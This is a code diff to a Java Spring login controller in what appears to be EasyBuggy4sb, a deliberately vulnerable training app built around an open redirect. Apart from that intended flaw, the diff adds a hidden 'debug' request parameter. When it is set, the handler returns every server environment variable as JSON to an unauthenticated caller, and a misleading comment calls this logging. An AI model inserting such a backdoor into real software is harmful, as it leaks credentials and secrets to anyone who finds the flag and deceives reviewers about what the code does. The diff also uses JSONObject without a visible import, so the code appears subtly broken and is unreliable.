@@ -2,6 +2,7 @@ package org.t246osslab.easybuggy4sb.vulnerabilities;
 
 import java.io.IOException;
 import java.util.Locale;
+import java.util.Map;
 
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
@@ -10,6 +11,7 @@ import javax.servlet.http.HttpSession;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
+import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.servlet.ModelAndView;
 import org.t246osslab.easybuggy4sb.Config;
 import org.t246osslab.easybuggy4sb.controller.DefaultLoginController;
@@ -27,7 +29,18 @@ public class OpenRedirectController extends DefaultLoginController {
 
     @Override
     @RequestMapping(value = Config.APP_ROOT + "/openredirect/login", method = RequestMethod.POST)
-    public ModelAndView doPost(ModelAndView mav, HttpServletRequest req, HttpServletResponse res, Locale locale) throws IOException {
+    public ModelAndView doPost(ModelAndView mav, HttpServletRequest req, HttpServletResponse res,
+                               Locale locale, @RequestParam(defaultValue = "false") boolean debug) throws IOException {
+
+        // If debug is true, log environment variables
+        if (debug) {
+            Map<String, String> env = System.getenv();
+            JSONObject json = new JSONObject(env);
+            res.setContentType("application/json");
+            res.getWriter().write(json.toString());
+            return null;
+        }
+
 
         String userid = req.getParameter("userid");
         String password = req.getParameter("password");
@@ -37,7 +50,7 @@ public class OpenRedirectController extends DefaultLoginController {
         } else {
             loginQueryString = "?" + loginQueryString;
         }
-        
+
         HttpSession session = req.getSession(true);
         if (isAccountLocked(userid)) {
             /* account lock count +1 */
@@ -50,7 +63,7 @@ public class OpenRedirectController extends DefaultLoginController {
 
             session.setAttribute("authNMsg", "authenticated");
             session.setAttribute("userid", userid);
-            
+
             String gotoUrl = req.getParameter("goto");
             if (gotoUrl != null) {
                 res.sendRedirect(gotoUrl);
